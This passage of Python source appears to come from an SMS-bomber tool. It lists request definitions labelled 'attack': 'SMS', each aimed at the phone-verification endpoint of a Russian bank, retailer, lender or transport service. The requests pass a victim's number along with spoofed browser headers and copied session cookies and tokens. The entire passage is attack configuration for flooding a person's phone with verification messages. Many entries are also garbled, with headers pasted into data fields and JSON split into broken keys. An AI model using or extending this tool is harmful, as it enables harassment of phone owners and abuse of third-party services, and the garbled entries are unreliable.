                'sec-ch-ua': 'Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user_agent()[1]
            },
            'data': {"number": number}
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'oapi.raiffeisen.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
            'headers': {

            },
            'data': {
                'wct_reg_fio': 'Пупкин',
                'wct_reg_fio2': 'Василий',
                'wct_reg_phone': 'madyart',
                'wct_reg_ch': 'Y',
                'wct_reg_1': '',
                'wct_reg_2': '',
                'wct_reg_3': '1',
                'USER_PHONE': '7',
                'USER_PHONE2': '',
                'LOGIN1': '071',
                'LOGIN2': '072',
                'wc_phone_psw': 'sdfgwse5rgfdzvbsedf',
                'wc_phone_psw2': 'sdfgwse5rgfdzvbsedf'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'madyart.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://madyart.ru/local/aut.php',
            'headers': {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '673',
                'Content-Type': 'application/json;charset=UTF-8',
                'Host': 'admin.growfood.pro',
                'Origin': 'https://growfood.pro',
                'Referer': 'https://growfood.pro/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'analyticalData': '{',
                'cookie': '{',
                'new_site': 'new',
                '_ga': 'GA1.2.330582126.1680820262',
                '_ym_uid': '16808202623003063882',
                'default_city': 'msk',
                'landingUpdateDefaultCity': 'msk',
                '_efst': 'ba657a5e9ce612ea91edd7442b7234b6509f0f4ce19abe517f66a024931a8966',
                'city_confirmed': 'true',
                'utm': '{}',
                'referrer': 'None',
                'host': 'growfood.pro',
                'client': '{',
                'phone': 'growfood',
                'cityId': '2'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'admin.growfood.pro',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'baggage': 'sentry-environment=prod-ru,sentry-public_key=dd1d902e97bb41b2a74f1b3085ae7b90,sentry-trace_id=355c468a4ec348ab85785e9e92a58cfb,sentry-sample_rate=0.3',
                'content-type': 'application/json; charset=UTF-8',
                'cookie': 'route=1680820917.106.1118.829394|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=igv6e0v73vouvqliq8rp4o8qhv; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=4bbcd7bfd0c9102467242ca243ed5d844d77cb0e29dba11fbac5c81df541132ea%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A96%3A%22%7B%22utm_source%22%3A%22Direct%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1; cf_chl_2=6ed16fa4ee7406c; cf_clearance=On.4KfrVBSBFmzK4HeBq8wWBoWXReX54BO4lGvGspG8-1680820926-0-150',
                'dnt': '1',
                'referer': 'https://abc.ru/registration/',
                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sentry-trace': '355c468a4ec348ab85785e9e92a58cfb-98221c61647946d4-1',
                'user-agent': user_agent()[1],
                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw',
                'content-length': '164',
                'origin': 'https://abc.ru',
                'bx-ajax': 'true',
                'x-bitrix-csrf-token': 'ce46266c9ca3de6414e13d163615c827',
                'x-bitrix-site-id': 's1'
            },
            'data': {
                '{"phone': number,
                '_csrf': 'oqqL7n8CPs-K8TyRRe11rFxa0lUmFcqXKMx-KWjt6-mQ_f2DLWVR9r2EW_t3rCHraQ2BYWd2g8RwvQ1cKaaviw=="}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'abc.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://abc.ru/clientapi/v1/user/phone-sms/',
            'headers': {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '505',
                'content-type': 'application/json',
                'cookie': '.AspNetCore.Culture=c%3Dru%7Cuic%3Dru',
                'origin': 'https://auth.mosmetro.ru',
                'referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3Df3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8%26code_challenge_method%3DS256%26nonce%3D638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi%26state%3Dfc7kxm178qekphufyqkq0k%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1]
            },
            'data': {
                '{"login': number,
                'returnUrl': '/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=f3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8&code_challenge_method=S256&nonce=638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi&state=fc7kxm178qekphufyqkq0k&ui_locales=ru&acr_values=theme%3Alight"}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'auth.mosmetro.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://auth.mosmetro.ru/api/auth/login/sms',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==',
                'origin': 'https://spb.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://spb.uteka.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'version': 'b835b033'
            },
            'data': {
                '{"jsonrpc': '2.0", "id": 8, "method": "auth.GetCode',
                'params': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'spb.uteka.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://spb.uteka.ru/rpc/?method=auth.GetCode',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'authorization': 'Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn',
                'content-length': '220',
                'content-type': 'application/json',
                'origin': 'https://elementaree.ru',
                'referer': 'https://elementaree.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent()[1]
            },
            'data': {
                '{"operationName': number,
                'query': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'api-new.elementaree.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api-new.elementaree.ru/graphql',
            'headers': {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Client': 'angular_web_0.0.2',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'text/plain',
                'Cookie': 'qrator_msid=1667526234.775.XKeTKEPsW4ov4g4D-6qn2qar0j8pjc4gatudrriv26nb4dhqp; Utk_DvcGuid=50e83205-9a55-845c-3d3e-363cdc1925e4; Utk_SessionToken=3928A6E837779529C395A626B52E49E2; User_Agent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_MrkGrpTkn=1FCF76D07C49A5ED62F64683C21656E9; agree_with_cookie=true; Utk_SssTkn=3928A6E837779529C395A626B52E49E2',
                'Deviceid': '50e83205-9a55-845c-3d3e-363cdc1925e4',
                'Host': 'moscow.online.lenta.com',
                'Origin': 'https://moscow.online.lenta.com',
                'Referer': 'https://moscow.online.lenta.com/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'SessionToken': '3928A6E837779529C395A626B52E49E2',
                'User-Agent': user_agent()[1],
                'x-domain': 'moscow',
                'x-retail-brand': 'lo'
            },
            'data': {"method": "authCodeSend", "params": {"phone": number}, "jsonrpc": "2.0", "id": 12}
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'moscow.online.lenta.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://moscow.online.lenta.com/jrpc',
            'headers': {

            },
            'data': {
                'except': '',
                'try': '',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2Njc1MjY0NzEsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NzUzMDI0NzF9.9Fgzk9RrWW82n5F2uUggsAyBuZHc_fqWZp-GOxph5qk',
                'Connection': 'keep-alive',
                'Cookie': 'qrator_jsr=1667526415.893.MfERRj629UrSfHpf-8rtud06upbosderhvl5g1ef3390ea0d5-00; qrator_jsid=1667526415.893.MfERRj629UrSfHpf-jm7luqtsup8el3ol2j60phv7fkan9i6u; qrator_ssid=1667526416.258.OYUlKh0aP6DY18Jw-u4fv9j20mlns9csfk011vboa84jsc382; isEreceiptedPopupShown_=true; ab_test_popup_delivery=test_group; motopopupforeveryone=1; isAddressPopupShown_=true; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; tmr_lvid=1af3ad7f44323452a463acb0f7f4e6ba; tmr_lvidTS=1667526432573; _ym_uid=166752643344618027; _ym_d=1667526433; kameleoonVisitorCode=_js_dq2tzq3u66bvzpow; rrpvid=149419622442899; _userGUID=0:la1u6mdr:Ks5DPIpdJXdMpsJ2bfqnyt6SX4WcJDpg; dSesn=36d4984e-ef17-39b9-6c97-f9b8134436c1; _dvs=0:la1u6mdr:OwFvRPS2gUvDudZhy0uiDpFn6wuQj3Eh; _ym_isad=2; rcuid=63646f12e2746a93f2420567; haveChat=true; tmr_detect=0%7C1667526435285; device_id=206053908846.45267; tmr_reqNum=5',
                'Host': 'www.auchan.ru',
                'phone': number,
                'Referer': 'https://www.auchan.ru/auth/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'source': '4',
                'User-Agent': 'user'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.auchan.ru',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.auchan.ru/v1/cmd/clientprofile/checkphone',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'content-type': 'application/json',
                'cookie': '_cfuvid=niRXx8FEscDdwEZcbQBkuUsNaKKENY758SgtDB57zoA-1667585854597-0-604800000; favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; searchPlaceholder=%25D0%25A3%25D1%2586%25D0%25B5%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5%2520%25D1%2581%25D0%25BC%25D0%25B0%25D1%2580%25D1%2582%25D1%2584%25D0%25BE%25D0%25BD%25D1%258B; __cf_bm=aBYWEoj8cSOBrcje9oCzroNpBVWTD0qYy_avyt1ea2g-1667590182-0-AXB6r6+dn1ulF7849ULVkAdvlQwYGsG9o4/7Hke1yzaI5xD+kHzm18NsHRU8UJFr6pkbrkJ8T3F8ZEdq0ZzXRfOjH8NTmifBlC1B+icPKgWuyiBpmhdLKZPy669t6TZkTocJNii2TX87IZjN0ER0Tcu9YAtHYnErIk5enhaa9K7lOL6VPE4p+wtDuJkSx7rTOA==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA',
                'x-requested-with': 'XMLHttpRequest'
            },
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.svyaznoy.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{str(number)[1:]}',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'cache-control-version': '527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f',
                'content-length': '38',
                'content-type': 'application/json',
                'cookie': 'referrer_first=dir; referrer_hist=dir; referrer=; accept_language=ru; abst=test_a; vid=b13a31d4-2feb-49e0-8f7d-a33aface1476; rm=758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249; sid=g0v+9sLViCLWl3Koz3ws/AwH; ENVID=production-a|Y2VvQ',
                'origin': 'https://www.onetwotrip.com',
                'referer': 'https://www.onetwotrip.com/ru/p/account',
                'sec-ch-ua': 'Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-ott-cookie': '',
                'Host': 'id.x5.ru',
                'Connection': 'keep-alive',
                'Content-Length': '62',
                'Content-Type': 'text/plain;charset=UTF-8',
                'User-Agent': user_agent()[1],
                'Accept': '*/*',
                'Origin': 'https://id.x5.ru',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://id.x5.ru/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Cookie': 'ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; NSC_je_djq_l8t_31443_IUUQT_OB_WT=ffffffffc3a06eea45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; TS9f472ee0027=08549da071ab200080e88c8e8e79e0a43eec4808dc4dbf3994e4c7202a42afcb9ff6e8076bae3b9a083c8fa200113000306ff3aaede77deedd6aa63205e1b29bbdaf2a4c116f66a0c6d4cefe4d22b0b7ba3d19b0aaa7c1d572af87f3342ab1a8'
            },
            'data': {
                'phone': number,
                'reseller': ''
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'id.x5.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://id.x5.ru/graphql',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '368',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': '__ddg1_=7adIg7X1SQ3s1sqTbKQz; PHPSESSID=a840033f0d2b10e34442f83013bb3f0f; partner=zseo',
                'origin': 'https://borrow.zaymigo.com',
                'referer': 'https://borrow.zaymigo.com/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1]
            },
            'data': {
                '{"jsonrpc': '2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create',
                'params': '{',
                'borrower': '{"surname": "Пупкин", "name": "Василий", "patronymic": "Андреевич',
                'patronymicNotExists': number,
                'phoneParams': '[]}',
                'term': '12, "amount": 10000',
                'agreements': '[{"name": "assignment_of_claims", "val": True}]}}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'borrow.zaymigo.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://borrow.zaymigo.com/rpc/v1',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '224',
                'content-type': 'application/json',
                'cookie': '_ga=GA1.2.2108841258.1667680421; _gid=GA1.2.1628483400.1667680421; tmr_lvid=5c385c2b38e5657a71fb6f8ccf348cf0; tmr_lvidTS=1667680421368; _ym_uid=1667680422433564150; _ym_d=1667680422; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL; __cfruid=354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508; ec_id=b22e8141-a6a2-49e9-addf-d0958d4b2bef; tmr_detect=0%7C1667680526135; deviceUid=ff004018-91ab-4913-9761-9c8c510136c2; tmr_reqNum=15',
                'origin': 'https://adengi.ru',
                'referer': 'https://adengi.ru/registration/personal',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
                'x-version-fe': '1666591147478'
            },
            'data': {
                'email': email(),
                'firstName': 'Василий',
                'hash': 'a6ac90134b55d015bd2731fd4e2f06d3',
                'lastName': 'Пупин',
                'middleName': 'Иванович',
                'phone': number,
                'timestamp': '1667680555',
                'via': 'sms'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'adengi.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://adengi.ru/rest/v1/registration/code/send',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==; uteka_city_id=47; _ru_yandex_autofill=not_available',
                'origin': 'https://krym.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://krym.uteka.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'version': 'b835b033'
            },
            'data': {
                '{"jsonrpc': '2.0", "id": 6, "method": "auth.GetCode',
                'params': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'krym.uteka.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://krym.uteka.ru/rpc/?method=auth.GetCode',
            'headers': {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': '',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'application/json',
                'Cookie': 'zdr_customer_external_id=44e62396-1cee-4165-80a3-8ce848633410; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D; deviceId=6adada4b-b83b-406a-ac5b-b6101d282cdc; is-converted-basket=true; is-converted-liked=true; qrator_jsid=1667778933.193.ee7fMuSZ0aiaAQ0h-9qis1t0fph2cphoe2s5j19q05nb2m296',
                'Host': 'zdorov.ru',
                'Origin': 'https://zdorov.ru',
                'Referer': 'https://zdorov.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'phone': number,
                'deviceId': '6adada4b-b83b-406a-ac5b-b6101d282cdc',
                'term': '2'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'zdorov.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://zdorov.ru/backend/api/customer/confirm',
            'headers': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '101',
                'Content-type': 'application/vnd.api+json',
                'Cookie': 'guid_city=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; name_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; guid_region=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; guid_country=8aa15da9-92a4-4530-ab74-1992c973c539; region_timezone=UTC%2B3%3A00; ab-test-user-id=b81234b62c57e7db8f97bb8c5aae7d2dc5a20488c38e1f6963ee8a14a3356f7da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22933133d1ca8f2277c2dbc5671647b30d%22%3B%7D; fuser_id=400a9f05c3d4eea2e6a463167ceffc5a9113a569cfa9a16392484053b87bfcaaa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%2224e973c408cc57099eac88d53ad12205%22%3B%7D; PHPSESSID=0hd82290tod529ln49unqlitke; _csrf=ab463b1a39cb814c72899b49f7e46e245f5ca7b88de51eda4075fd2da58abc93a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22-qTZJe5FI0mRe2WzkLYoSlrqTgr4wVOJ%22%3B%7D; inova_p_sid=qol791i_221109090955; windowDate=2022%2011%2009',
                'Host': 'sokolov.ru',
                'Origin': 'https://sokolov.ru',
                'Referer': 'https://sokolov.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'data': '{"type": "login',
                'attributes': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'sokolov.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://sokolov.ru/api/v4/profile/user/send-code',
            'headers': {

            },
            'data': {
                '{"data': number,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '68',
                'Content-Type': 'application/json',
                'Cookie': 'xid=f977bd6a-7555-4825-8c30-2f80517a7c81; catalogGender=women; uuid=84513f80-afe7-4390-b9ab-cbef7219cdc9; siteVer=1.0.0; _slfs=1668014274236; _slid=636be0af01b07254b104fe53; _slsession=06C229F2-EBA7-43B8-BE6D-ED83E1A61A4E; actual-checkout-type=cart; gtmc_userAuth=0; __zzatw-tsum=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VfRGwkGXtfUEBcUn4qFhV/bShMDz5ePT5vMTE7ah5meGBSS1Y/dRdZRkE2XBpLdWUJCzowJS0xViR8SylEW1MJJRoVeXIoVg0QVy8QLj9hTixcIggWEU0hF0ZaFXtDPGMMcRVNfX0mNGd/ImUrOVURCBISIGNVWml1WQhDThgSPV8qWFcMNHhlEENYfXFrL2R7RSRfHDx1ZS8zaWVpcC9gIBIlEU0hF0ZaFXtDLGAMcRVcQ0d1cyo/ZyRkTl8nP0ccOmlRJD4yXhA8dWUJCzowJS0xZid8Syk1HREyXldVNDtnQXt1IHJ+FDllDFcnHXgdYngqIg==H7n1MA==; wishlist_sid=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_release=19257c11ea8e8373036b532c32b28dc6458b591b; gtmc_city=%D0%A1%D1%82%D1%80%D0%B0%D1%81%D0%B1%D1%83%D1%80%D0%B3; gtmc_region=null; gtmc_country=%D0%A4%D1%80%D0%B0%D0%BD%D1%86%D0%B8%D1%8F; x-wishlist-sid-local=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; gssc213163=; 